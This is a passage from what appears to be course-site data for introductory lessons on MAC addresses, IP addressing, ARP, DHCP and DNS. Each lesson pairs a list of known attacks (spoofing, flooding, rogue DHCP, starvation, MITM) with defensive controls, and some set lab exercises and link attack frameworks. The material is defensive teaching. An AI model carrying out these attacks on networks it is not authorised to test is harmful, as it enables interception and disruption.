                  <a href="https://www.cloudflare.com/learning/" target="_blank" rel="noopener">Cloudflare Learning — TCP handshake explained</a>
                </div>
              </section>
            ` },
                    { id: "1.6", title: "MAC Addresses", pages: "83-92", read: 14,
            build: "Read your own MAC, identify the OUI, and explain spoofing risk.",
            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p>A <strong>MAC Address</strong> (Media Access Control Address) is a unique 48-bit identifier assigned to a Network Interface Card (NIC) by the manufacturer. It operates at <strong>Layer 2 (Data Link)</strong> and is used for communication within a local network segment. Also called a physical, hardware, or Ethernet address.</p>
                <p>A MAC address is written in hexadecimal, typically as six groups of two digits separated by colons or hyphens — for example: <code>00:1A:2B:3C:4D:5E</code>.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. A Real-World Analogy</h3>
                <p>Every mobile phone has an IMEI number — unique to that phone, burned into the hardware. Similarly, every network card has a MAC address burned into it at the factory.</p>
                <p>When your laptop sends data to your printer on the same Wi-Fi, the frame carries your laptop's MAC as source and the printer's MAC as destination. The switch uses these addresses to deliver the frame to the correct device.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. Structure of a MAC Address</h3>

                <figure class="content-figure">
                  <img src="./img/mac-address.png" alt="MAC address structure — OUI portion and NIC-specific portion" />
                  <figcaption>Figure 6.1 — MAC address anatomy. The first 24 bits identify the manufacturer (OUI); the last 24 bits identify the specific device.</figcaption>
                </figure>

                <div class="tool-table">
                  <div class="tool-row tool-header">
                    <span>Part</span><span>Size</span><span>Purpose</span>
                  </div>
                  <div class="tool-row"><span>OUI</span><span>First 24 bits</span><span>Manufacturer identifier</span></div>
                  <div class="tool-row"><span>NIC Specific</span><span>Last 24 bits</span><span>Unique device serial</span></div>
                </div>
                <p>Example: <code>00:1A:2B</code> is the OUI, and <code>3C:4D:5E</code> is the NIC-specific portion.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. Types of MAC Addresses</h3>
                <div class="tool-table">
                  <div class="tool-row tool-header">
                    <span>Type</span><span>Purpose</span><span>Example</span>
                  </div>
                  <div class="tool-row"><span>Unicast</span><span>One-to-one</span><span>00:1A:2B:3C:4D:5E</span></div>
                  <div class="tool-row"><span>Multicast</span><span>One-to-many group</span><span>01:00:5E:...</span></div>
                  <div class="tool-row"><span>Broadcast</span><span>One-to-all on LAN</span><span>FF:FF:FF:FF:FF:FF</span></div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. MAC vs IP Address</h3>
                <div class="tool-table">
                  <div class="tool-row tool-header">
                    <span>Feature</span><span>MAC</span><span>IP</span>
                  </div>
                  <div class="tool-row"><span>Layer</span><span>Layer 2</span><span>Layer 3</span></div>
                  <div class="tool-row"><span>Type</span><span>Physical</span><span>Logical</span></div>
                  <div class="tool-row"><span>Permanence</span><span>Fixed in hardware</span><span>Can change</span></div>
                  <div class="tool-row"><span>Format</span><span>Hex</span><span>Dotted decimal</span></div>
                  <div class="tool-row"><span>Scope</span><span>Local network</span><span>Global</span></div>
                  <div class="tool-row"><span>Assigned by</span><span>Manufacturer</span><span>ISP / DHCP</span></div>
                </div>
                <p><strong>Rule of thumb:</strong> MAC is for local delivery; IP is for global routing.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Attack Vectors</h3>
                <div class="cia-grid">
                  <div class="cia-attack">
                    <span class="cia-label attack">Known Attacks</span>
                    <ul>
                      <li><strong>MAC Spoofing</strong> — Change your MAC to impersonate another device; bypasses MAC filtering</li>
                      <li><strong>MAC Flooding</strong> — Thousands of fake MACs overflow the CAM table; the switch behaves like a hub</li>
                      <li><strong>ARP Spoofing</strong> — Fake ARP replies associate attacker's MAC with a victim's IP</li>
                      <li><strong>MAC Filtering Bypass</strong> — Spoofing defeats MAC allow-lists</li>
                      <li><strong>Tracking</strong> — Public Wi-Fi / Bluetooth devices broadcast MACs; used for movement tracking</li>
                    </ul>
                  </div>
                  <div class="cia-defense">
                    <span class="cia-label defense">Defensive Controls</span>
                    <ul>
                      <li><strong>Port Security</strong> — Allow only specific MACs per port</li>
                      <li><strong>DHCP Snooping</strong> — Build MAC-IP-port binding table</li>
                      <li><strong>Dynamic ARP Inspection</strong> — Validate ARP packets against the binding table</li>
                      <li><strong>MACsec (802.1AE)</strong> — Layer 2 encryption and integrity</li>
                      <li><strong>802.1X</strong> — Port-based authentication</li>
                      <li><strong>MAC Randomization</strong> — Modern devices randomize MACs for privacy</li>
                      <li><strong>Table Monitoring</strong> — Detect sudden MAC table changes</li>
                    </ul>
                  </div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>MAC is a 48-bit hardware identifier at Layer 2.</li>
                  <li>Two parts: OUI (manufacturer) and NIC-specific (unique).</li>
                  <li>Types: Unicast, Multicast, Broadcast.</li>
                  <li>Switches use MAC address tables (CAM) to forward frames.</li>
                  <li>MAC spoofing, flooding, and ARP spoofing are major attacks.</li>
                  <li>Defenses: Port Security, DAI, DHCP Snooping, MACsec, 802.1X.</li>
                  <li>MAC = local delivery; IP = global routing.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">8. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://www.wireshark.org/" target="_blank" rel="noopener">Wireshark — Inspect MAC addresses in frames</a>
                  <a href="https://github.com/alobbs/macchanger" target="_blank" rel="noopener">macchanger — Change MAC on Linux</a>
                  <a href="https://www.bettercap.org/" target="_blank" rel="noopener">Bettercap — Network attack framework</a>
                  <a href="https://standards.ieee.org/standard/802_1X-2010.html" target="_blank" rel="noopener">IEEE 802.1X — Port-based access control</a>
                </div>
              </section>
            ` },
                    { id: "1.7", title: "IP Addresses (IPv4 / IPv6)", pages: "93-108", read: 20,
            build: "Assign IPs to a small network. Explain private vs public, static vs dynamic.",
            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p>An <strong>IP Address</strong> (Internet Protocol Address) is a logical numeric identifier assigned to a device on a network. It operates at <strong>Layer 3 (Network)</strong> and is used for routing packets across multiple networks, including the Internet. An IP address identifies both the network and the host within that network.</p>
                <p>Two versions are in use today: <strong>IPv4</strong> (32-bit, dotted-decimal, e.g., <code>192.168.1.10</code>) and <strong>IPv6</strong> (128-bit, hexadecimal, e.g., <code>2001:0db8:85a3::8a2e:0370:7334</code>).</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. A Real-World Analogy</h3>
                <p>Think of a postal address — house number, street, city, postal code. An IP address works similarly. When you send data over the Internet, your device includes its source IP and the destination IP. Routers use the destination IP to forward the packet toward the correct network, and finally to the correct device.</p>
                <p>Without IP addresses, the Internet could not route data between billions of devices.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. IPv4 Structure</h3>

                <figure class="content-figure">
                  <img src="./img/ip-address.png" alt="IPv4 and IPv6 address structure — network portion and host portion" />
                  <figcaption>Figure 7.1 — IP addressing anatomy. IPv4 uses 32-bit dotted-decimal, IPv6 uses 128-bit hexadecimal. The subnet mask defines the network/host boundary.</figcaption>
                </figure>

                <p>An IPv4 address is 32 bits long, split into four <strong>octets</strong> (8 bits each). Each octet ranges from 0 to 255, separated by dots.</p>
                <p>Example: <code>192.168.1.10</code> — 192 (first), 168 (second), 1 (third), 10 (fourth).</p>
                <p>In binary: <code>11000000.10101000.00000001.00001010</code></p>

                <h4 class="sub-h">Network and Host Portions</h4>
                <p>An IP address has two parts: the <strong>network portion</strong> identifies the network, and the <strong>host portion</strong> identifies the specific device. The boundary is defined by the <strong>subnet mask</strong>.</p>
                <p>Example: IP <code>192.168.1.10</code> with mask <code>255.255.255.0</code> — first three octets are network, last octet is host.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. IPv4 Address Classes (Historical)</h3>
                <div class="tool-table">
                  <div class="tool-row tool-header">
                    <span>Class</span><span>First Octet</span><span>Default Mask</span><span>Purpose</span>
                  </div>
                  <div class="tool-row"><span>A</span><span>1–126</span><span>255.0.0.0</span><span>Large networks</span></div>
                  <div class="tool-row"><span>B</span><span>128–191</span><span>255.255.0.0</span><span>Medium networks</span></div>
                  <div class="tool-row"><span>C</span><span>192–223</span><span>255.255.255.0</span><span>Small networks</span></div>
                  <div class="tool-row"><span>D</span><span>224–239</span><span>N/A</span><span>Multicast</span></div>
                  <div class="tool-row"><span>E</span><span>240–255</span><span>N/A</span><span>Experimental</span></div>
                </div>
                <p>Modern networks use <strong>CIDR</strong> (Classless Inter-Domain Routing) instead of classes.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. Private vs Public IPs</h3>

                <h4 class="sub-h">Private Ranges</h4>
                <ul class="content-list">
                  <li><code>10.0.0.0</code> – <code>10.255.255.255</code></li>
                  <li><code>172.16.0.0</code> – <code>172.31.255.255</code></li>
                  <li><code>192.168.0.0</code> – <code>192.168.255.255</code></li>
                </ul>
                <p>Private IPs are used within local networks and are <strong>not routable</strong> on the Internet.</p>

                <h4 class="sub-h">Public IPs</h4>
                <p>Globally unique and routable on the Internet. Assigned by ISPs.</p>

                <h4 class="sub-h">NAT — Network Address Translation</h4>
                <p>NAT lets multiple devices with private IPs share a single public IP. The router translates private IPs to the public IP on outgoing traffic and reverses it on incoming traffic.</p>

                <h4 class="sub-h">Static vs Dynamic</h4>
                <ul class="content-list">
                  <li><strong>Static</strong> — Manually configured, never changes. Used for servers.</li>
                  <li><strong>Dynamic</strong> — Assigned by DHCP. Used for most client devices.</li>
                </ul>

                <h4 class="sub-h">Special Addresses</h4>
                <ul class="content-list">
                  <li><strong>Loopback</strong> — <code>127.0.0.1</code> refers to the local device</li>
                  <li><strong>APIPA</strong> — <code>169.254.x.x</code> assigned when DHCP fails</li>
                  <li><strong>Broadcast</strong> — Highest address in a subnet (e.g., <code>192.168.1.255</code>)</li>
                  <li><strong>Network Address</strong> — Lowest address in a subnet (e.g., <code>192.168.1.0</code>)</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. IPv6 Overview</h3>
                <p>IPv6 was created to solve IPv4 exhaustion. It uses 128 bits — eight groups of four hexadecimal digits, separated by colons.</p>
                <p>Example: <code>2001:0db8:85a3:0000:0000:8a2e:0370:7334</code></p>
                <p><strong>Benefits:</strong> Vastly larger address space, built-in IPsec security, simplified header structure.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Attack Vectors</h3>
                <div class="cia-grid">
                  <div class="cia-attack">
                    <span class="cia-label attack">Known Attacks</span>
                    <ul>
                      <li><strong>IP Spoofing</strong> — Forge source IP to hide identity or bypass IP trust</li>
                      <li><strong>DDoS</strong> — Flood a target IP using botnets</li>
                      <li><strong>Port Scanning</strong> — Discover live hosts and open ports</li>
                      <li><strong>Geolocation Tracking</strong> — Public IPs reveal approximate location and ISP</li>
                      <li><strong>MITM</strong> — Manipulate routing or ARP to intercept</li>
                      <li><strong>IP Fragmentation</strong> — Teardrop, Ping of Death</li>
                    </ul>
                  </div>
                  <div class="cia-defense">
                    <span class="cia-label defense">Defensive Controls</span>
                    <ul>
                      <li><strong>Ingress/Egress Filtering</strong> — Block spoofed source IPs at borders</li>
                      <li><strong>Firewalls</strong> — Allow only necessary traffic; default deny</li>
                      <li><strong>IPsec</strong> — Encrypt and authenticate IP packets</li>
                      <li><strong>VPN</strong> — Encrypt traffic and hide real IP</li>
                      <li><strong>IDS/IPS</strong> — Detect and block malicious IPs</li>
                      <li><strong>Network Segmentation</strong> — Subnets and VLANs</li>
                      <li><strong>Monitoring &amp; Logging</strong> — Track unusual IP activity</li>
                    </ul>
                  </div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">8. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>An IP address is a logical identifier at Layer 3.</li>
                  <li>IPv4 uses 32 bits; IPv6 uses 128 bits.</li>
                  <li>Network and host portions are defined by the subnet mask.</li>
                  <li>Private IPs are for local networks; public IPs are for the Internet.</li>
                  <li>NAT translates private IPs to public IPs.</li>
                  <li>Static IPs are fixed; dynamic IPs are assigned by DHCP.</li>
                  <li>Attacks: IP spoofing, DDoS, scanning, tracking, MITM.</li>
                  <li>Defenses: filtering, firewalls, IPsec, VPN, segmentation, monitoring.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">9. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://nmap.org/" target="_blank" rel="noopener">Nmap — Host discovery and port scanning</a>
                  <a href="https://whois.icann.org/" target="_blank" rel="noopener">WHOIS — IP and domain ownership</a>
                  <a href="https://www.shodan.io/" target="_blank" rel="noopener">Shodan — Internet-connected device search</a>
                  <a href="https://stat.ripe.net/" target="_blank" rel="noopener">RIPE Stat — Routing and IP data</a>
                  <a href="https://www.cloudflare.com/learning/" target="_blank" rel="noopener">Cloudflare Learning — IP addressing</a>
                </div>
              </section>
            ` },
                    { id: "1.8", title: "ARP — Address Resolution Protocol", pages: "109-118", read: 15,
            build: "Perform ARP Spoofing in a lab, then mitigate with Dynamic ARP Inspection.",
            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p><strong>ARP (Address Resolution Protocol)</strong> is a Layer 2 protocol used to map a known IPv4 address to its corresponding MAC address on a local network. When a device knows the IP of another device but needs the MAC to send a frame, it uses ARP to resolve the mapping.</p>
                <p>ARP operates at the boundary between Layer 2 and Layer 3 of the OSI model. It is defined in <strong>RFC 826</strong>.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. A Real-World Analogy</h3>
                <p>Imagine you are in a large office and know a colleague's <em>desk number</em> (IP address) but not their <em>name</em> (MAC address). You announce: "Whoever is at desk 42, please tell me your name." The person replies: "I'm at desk 42 — my name is Alice." Now you can address them directly.</p>
                <p>ARP works exactly like this. A device broadcasts: "Who has IP 192.168.1.20? Tell me your MAC." The device with that IP replies with its MAC. The sender stores the mapping in its ARP cache.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. How ARP Works</h3>

                <figure class="content-figure">
                  <img src="./img/arp-protocol.png" alt="ARP request broadcast and ARP reply unicast between two devices on a LAN" />
                  <figcaption>Figure 8.1 — ARP resolution. The sender broadcasts an ARP request to FF:FF:FF:FF:FF:FF; the target replies unicast with its MAC address.</figcaption>
                </figure>

                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span>
                    <div><strong>ARP Request (Broadcast)</strong>
                    <p>Sender broadcasts to FF:FF:FF:FF:FF:FF — "Who has IP X? Tell me your MAC."</p></div>
                  </div>
                  <div class="step-item"><span class="step-num">2</span>
                    <div><strong>ARP Reply (Unicast)</strong>
                    <p>The device with IP X replies directly — "I have IP X. My MAC is Y."</p></div>
                  </div>
                  <div class="step-item"><span class="step-num">3</span>
                    <div><strong>ARP Cache</strong>
                    <p>The sender caches the IP-to-MAC mapping to avoid repeated requests. Entries expire after a timeout.</p></div>
                  </div>
                </div>

                <h4 class="sub-h">ARP Packet Fields</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header">
                    <span>Field</span><span>Value / Purpose</span>
                  </div>
                  <div class="tool-row"><span>Hardware Type</span><span>Ethernet (1)</span></div>
                  <div class="tool-row"><span>Protocol Type</span><span>IPv4 (0x0800)</span></div>
                  <div class="tool-row"><span>Hardware Length</span><span>6 (MAC length)</span></div>
                  <div class="tool-row"><span>Protocol Length</span><span>4 (IPv4 length)</span></div>
                  <div class="tool-row"><span>Operation</span><span>1 = Request, 2 = Reply</span></div>
                  <div class="tool-row"><span>Sender MAC / IP</span><span>Originating device</span></div>
                  <div class="tool-row"><span>Target MAC / IP</span><span>Lookup target (MAC zero in request)</span></div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. Types of ARP</h3>
                <ul class="content-list">
                  <li><strong>Dynamic ARP</strong> — Automatically learned and cached with timeout</li>
                  <li><strong>Static ARP</strong> — Manually configured, never expires; used for critical devices</li>
                  <li><strong>Gratuitous ARP</strong> — Device announces its own IP-to-MAC mapping; used for conflict detection and cache updates</li>
                  <li><strong>Proxy ARP</strong> — Router answers ARP on behalf of a device on another network</li>
                  <li><strong>RARP</strong> — Obsolete; reverse (MAC → IP). Replaced by DHCP</li>
                </ul>

                <h4 class="sub-h">Viewing the ARP Cache</h4>
                <p><strong>Windows:</strong> <code>arp -a</code></p>
                <p><strong>Linux / macOS:</strong> <code>arp -a</code> or <code>ip neigh</code></p>
                <div class="chapter-code-block">
                  <div class="code-block-head"><span>Sample ARP cache output</span></div>
                  <pre><code>192.168.1.1     00:1A:2B:3C:4D:5E   dynamic
192.168.1.20    00:1A:2B:3C:4D:5F   dynamic</code></pre>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. Attack Vectors</h3>
                <div class="cia-grid">
                  <div class="cia-attack">
                    <span class="cia-label attack">Known Attacks</span>
                    <ul>
                      <li><strong>ARP Spoofing / Poisoning</strong> — Forged ARP replies claim attacker's MAC is the gateway; MITM</li>
                      <li><strong>ARP Flooding</strong> — Mass ARP replies overwhelm switches and hosts</li>
                      <li><strong>MAC Spoofing + ARP</strong> — Combined to impersonate legitimate devices</li>
                      <li><strong>Session Hijacking</strong> — Intercepted traffic lets attacker steal session cookies</li>
                    </ul>
                  </div>
                  <div class="cia-defense">
                    <span class="cia-label defense">Defensive Controls</span>
                    <ul>
                      <li><strong>Dynamic ARP Inspection (DAI)</strong> — Validates ARP against trusted binding table</li>
                      <li><strong>DHCP Snooping</strong> — Builds MAC-IP-port-VLAN binding table for DAI</li>
                      <li><strong>Static ARP entries</strong> — For critical devices (gateway)</li>
                      <li><strong>arpwatch</strong> — Monitor ARP activity and alert on changes</li>
                      <li><strong>Encryption</strong> — HTTPS, VPN, SSH defeat MITM even if spoofing succeeds</li>
                      <li><strong>VLAN segmentation</strong> — Limits ARP spoofing scope</li>
                      <li><strong>Port Security</strong> — Limit MACs per port</li>
                    </ul>
                  </div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>ARP maps IP addresses to MAC addresses on a local network.</li>
                  <li>ARP requests are broadcast; ARP replies are unicast.</li>
                  <li>The ARP cache stores mappings temporarily.</li>
                  <li>Types: Dynamic, Static, Gratuitous, Proxy, RARP.</li>
                  <li>ARP spoofing enables MITM attacks.</li>
                  <li>Defenses: DAI, DHCP Snooping, static ARP, encryption, monitoring.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://www.wireshark.org/" target="_blank" rel="noopener">Wireshark — Analyze ARP packets</a>
                  <a href="https://www.bettercap.org/" target="_blank" rel="noopener">Bettercap — Network attack framework</a>
                  <a href="https://ee.lbl.gov/" target="_blank" rel="noopener">arpwatch — ARP monitoring</a>
                  <a href="https://tools.ietf.org/html/rfc826" target="_blank" rel="noopener">RFC 826 — ARP specification</a>
                </div>
              </section>
            ` },
                    { id: "1.9", title: "DHCP — Dynamic Host Configuration Protocol", pages: "119-128", read: 15,
            build: "Simulate a rogue DHCP server in a lab and detect it.",
            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p><strong>DHCP (Dynamic Host Configuration Protocol)</strong> automatically assigns IP addresses, subnet masks, default gateways, DNS servers, and other network settings to devices. It operates at the <strong>Application Layer (Layer 7)</strong> and uses UDP ports <code>67</code> (server) and <code>68</code> (client).</p>
                <p>DHCP eliminates manual IP configuration and prevents address conflicts.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. A Real-World Analogy</h3>
                <p>When you connect your laptop to a coffee shop's Wi-Fi, you never type an IP address, subnet mask, or DNS server. Your laptop gets all these settings automatically from the shop's DHCP server — Internet works within seconds.</p>
                <p>In a corporate office with hundreds of devices joining daily, DHCP ensures each gets a unique IP and correct settings without manual work.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. What DHCP Provides</h3>
                <div class="tool-table">
                  <div class="tool-row tool-header">
                    <span>Parameter</span><span>Purpose</span>
                  </div>
                  <div class="tool-row"><span>IP Address</span><span>Unique address for the device</span></div>
                  <div class="tool-row"><span>Subnet Mask</span><span>Network / host boundary</span></div>
                  <div class="tool-row"><span>Default Gateway</span><span>Router for external traffic</span></div>
                  <div class="tool-row"><span>DNS Servers</span><span>Name resolution</span></div>
                  <div class="tool-row"><span>Lease Time</span><span>Validity duration of IP</span></div>
                  <div class="tool-row"><span>NTP Servers</span><span>Time synchronization</span></div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. The DORA Process</h3>

                <figure class="content-figure">
                  <img src="./img/dhcp-dora.png" alt="DHCP DORA process — Discover, Offer, Request, Acknowledge between client and server" />
                  <figcaption>Figure 9.1 — The DORA handshake. Client broadcasts DISCOVER; server OFFERs; client REQUESTs; server ACKnowledges the lease.</figcaption>
                </figure>

                <div class="step-flow">
                  <div class="step-item"><span class="step-num">D</span>
                    <div><strong>Discover</strong>
                    <p>Client broadcasts DHCPDISCOVER — Source IP <code>0.0.0.0</code>, Destination <code>255.255.255.255</code>.</p></div>
                  </div>
                  <div class="step-item"><span class="step-num">O</span>
                    <div><strong>Offer</strong>
                    <p>Server sends DHCPOFFER with an available IP and configuration parameters.</p></div>
                  </div>
                  <div class="step-item"><span class="step-num">R</span>
                    <div><strong>Request</strong>
                    <p>Client broadcasts DHCPREQUEST to accept the offer and inform other servers.</p></div>
                  </div>
                  <div class="step-item"><span class="step-num">A</span>
                    <div><strong>Acknowledge</strong>
                    <p>Server sends DHCPACK confirming the lease. The client can now use the IP.</p></div>
                  </div>
                </div>

                <h4 class="sub-h">Lease Renewal</h4>
                <ul class="content-list">
                  <li><strong>T1 (50% of lease)</strong> — Client renews via unicast to original server</li>
                  <li><strong>T2 (87.5%)</strong> — If T1 fails, client broadcasts to any server</li>
                  <li><strong>Expiry</strong> — Client must stop using the IP</li>
                </ul>

                <h4 class="sub-h">DHCP Message Types</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header">
                    <span>Message</span><span>Purpose</span>
                  </div>
                  <div class="tool-row"><span>DHCPDISCOVER</span><span>Client searches for servers</span></div>
                  <div class="tool-row"><span>DHCPOFFER</span><span>Server offers an IP</span></div>
                  <div class="tool-row"><span>DHCPREQUEST</span><span>Client requests the offer</span></div>
                  <div class="tool-row"><span>DHCPACK</span><span>Server confirms lease</span></div>
                  <div class="tool-row"><span>DHCPNAK</span><span>Server refuses request</span></div>
                  <div class="tool-row"><span>DHCPRELEASE</span><span>Client releases IP</span></div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. Advanced DHCP Concepts</h3>
                <ul class="content-list">
                  <li><strong>DHCP Relay</strong> — Forwards broadcasts across subnets (broadcasts do not cross routers)</li>
                  <li><strong>DHCP Reservation</strong> — Always assigns the same IP to a specific MAC (for printers, servers, cameras)</li>
                  <li><strong>APIPA</strong> — <code>169.254.x.x</code> — assigned when DHCP fails; signals no network</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Attack Vectors</h3>
                <div class="cia-grid">
                  <div class="cia-attack">
                    <span class="cia-label attack">Known Attacks</span>
                    <ul>
                      <li><strong>Rogue DHCP Server</strong> — Attacker serves false gateway/DNS; enables MITM</li>
                      <li><strong>DHCP Starvation</strong> — Flood DISCOVER with spoofed MACs; exhaust IP pool → DoS</li>
                      <li><strong>DHCP Spoofing</strong> — Fake DHCP responses impersonate the server</li>
                      <li><strong>DHCP Option 82 Abuse</strong> — Manipulate relay info to bypass controls</li>
                    </ul>
                  </div>
                  <div class="cia-defense">
                    <span class="cia-label defense">Defensive Controls</span>
                    <ul>
                      <li><strong>DHCP Snooping</strong> — Trusted/untrusted ports; builds MAC-IP-port binding table</li>
                      <li><strong>Port Security</strong> — Limit MACs per port to block starvation</li>
                      <li><strong>802.1X</strong> — Authenticate before any network access</li>
                      <li><strong>Static IPs / Reservations</strong> — For critical infrastructure</li>
                      <li><strong>Monitoring</strong> — Watch DHCP logs for spikes or unknown servers</li>
                      <li><strong>Encryption</strong> — HTTPS/VPN neutralises MITM even if rogue DHCP succeeds</li>
                      <li><strong>SEND (IPv6)</strong> — Cryptographically validate DHCPv6 messages</li>
                    </ul>
                  </div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>DHCP automatically assigns IP addresses and network settings.</li>
                  <li>DORA: Discover, Offer, Request, Acknowledge.</li>
                  <li>Leases are temporary and must be renewed.</li>
                  <li>DHCP Relay forwards messages across subnets.</li>
                  <li>APIPA indicates DHCP failure.</li>
                  <li>Attacks: Rogue DHCP, Starvation, Spoofing.</li>
                  <li>Defenses: DHCP Snooping, Port Security, 802.1X, monitoring.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">8. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://www.wireshark.org/" target="_blank" rel="noopener">Wireshark — Capture DHCP DORA</a>
                  <a href="https://github.com/tomac/yersinia" target="_blank" rel="noopener">Yersinia — DHCP attack framework</a>
                  <a href="https://www.isc.org/dhcp/" target="_blank" rel="noopener">ISC DHCP — Reference implementation</a>
                  <a href="https://tools.ietf.org/html/rfc2131" target="_blank" rel="noopener">RFC 2131 — DHCP specification</a>
                </div>
              </section>
            ` },
                    { id: "1.10", title: "DNS — Domain Name System", pages: "129-142", read: 20,
            build: "Perform a DNS lookup chain end-to-end. Explain DNSSEC.",
            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p><strong>DNS (Domain Name System)</strong> is a hierarchical, distributed naming system that translates human-readable domain names (e.g., <code>www.example.com</code>) into machine-readable IP addresses (e.g., <code>192.0.2.1</code>). It operates at <strong>Layer 7</strong> and primarily uses UDP port <code>53</code> — TCP port <code>53</code> is used for large responses and zone transfers.</p>
                <p>DNS is often called the <em>"phonebook of the Internet."</em></p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. A Real-World Analogy</h3>
                <p>When you type <code>www.google.com</code>, your computer cannot connect to a name — it needs an IP. DNS resolves the name to something like <code>142.250.190.46</code>, and your browser connects. Without DNS, you would have to memorise IP addresses for every site.</p>
                <p>In a corporate network, DNS resolves internal names like <code>intranet.company.local</code> to internal IPs for easy access.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. The DNS Hierarchy</h3>
                <figure class="content-figure">
                  <img src="./img/dns-resolution.png" alt="DNS resolution process — client, resolver, root server, TLD server, authoritative server" />
                  <figcaption>Figure 10.1 — The DNS resolution chain. A resolver walks the hierarchy: root → TLD → authoritative server, then caches the answer for future queries.</figcaption>
                </figure>

                <ul class="content-list">
                  <li><strong>Root Level</strong> — Represented by a dot (<code>.</code>), managed by ICANN</li>
                  <li><strong>Top-Level Domains (TLDs)</strong> — <code>.com</code>, <code>.org</code>, <code>.net</code>, <code>.pk</code>, <code>.uk</code></li>
                  <li><strong>Second-Level Domains</strong> — <code>example.com</code>, <code>google.com</code></li>
                  <li><strong>Subdomains</strong> — <code>www.example.com</code>, <code>mail.example.com</code></li>
                  <li><strong>Hostnames</strong> — <code>server1.example.com</code></li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. Components and Resolution</h3>
                <div class="tool-table">
                  <div class="tool-row tool-header">
                    <span>Component</span><span>Function</span>
                  </div>
                  <div class="tool-row"><span>DNS Resolver</span><span>Recursive server that queries others on behalf of the client</span></div>
                  <div class="tool-row"><span>Root Server</span><span>Directs to the correct TLD server</span></div>
                  <div class="tool-row"><span>TLD Server</span><span>Directs to the authoritative name server</span></div>
                  <div class="tool-row"><span>Authoritative NS</span><span>Holds the domain's DNS records</span></div>
                  <div class="tool-row"><span>DNS Cache</span><span>Temporarily stores resolved records</span></div>
                </div>

                <h4 class="sub-h">Resolution Walkthrough</h4>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Client asks its configured resolver for <code>www.example.com</code></div>
                  <div class="step-item"><span class="step-num">2</span> If not cached, resolver queries a root server</div>
                  <div class="step-item"><span class="step-num">3</span> Root refers to the <code>.com</code> TLD server</div>
                  <div class="step-item"><span class="step-num">4</span> TLD refers to the authoritative name server for <code>example.com</code></div>
                  <div class="step-item"><span class="step-num">5</span> Authoritative server returns the IP</div>
                  <div class="step-item"><span class="step-num">6</span> Resolver caches and returns to the client</div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. DNS Record Types</h3>
                <div class="tool-table">
                  <div class="tool-row tool-header">
                    <span>Type</span><span>Purpose</span><span>Example</span>
                  </div>
                  <div class="tool-row"><span>A</span><span>Domain → IPv4</span><span>example.com → 192.0.2.1</span></div>
                  <div class="tool-row"><span>AAAA</span><span>Domain → IPv6</span><span>2001:db8::1</span></div>
                  <div class="tool-row"><span>CNAME</span><span>Alias</span><span>www → example.com</span></div>
                  <div class="tool-row"><span>MX</span><span>Mail server</span><span>mail.example.com</span></div>
                  <div class="tool-row"><span>NS</span><span>Authoritative name server</span><span>ns1.example.com</span></div>
                  <div class="tool-row"><span>TXT</span><span>SPF, DKIM, verification</span><span>v=spf1 ...</span></div>
                  <div class="tool-row"><span>PTR</span><span>Reverse DNS</span><span>IP → domain</span></div>
                  <div class="tool-row"><span>SRV</span><span>Service location</span><span>_sip._tcp.example.com</span></div>
                </div>

                <h4 class="sub-h">Caching &amp; TTL</h4>
                <p><strong>TTL (Time to Live)</strong> defines how long a record can be cached. Short TTL means faster propagation of changes but more queries. Long TTL reduces server load but slows updates.</p>

                <h4 class="sub-h">Transport Protocols</h4>
                <ul class="content-list">
                  <li><strong>UDP/53</strong> — standard queries (fast, connectionless)</li>
                  <li><strong>TCP/53</strong> — large responses, zone transfers, DNSSEC</li>
                  <li><strong>DoH</strong> — DNS over HTTPS (port 443, encrypted)</li>
                  <li><strong>DoT</strong> — DNS over TLS (port 853, encrypted)</li>
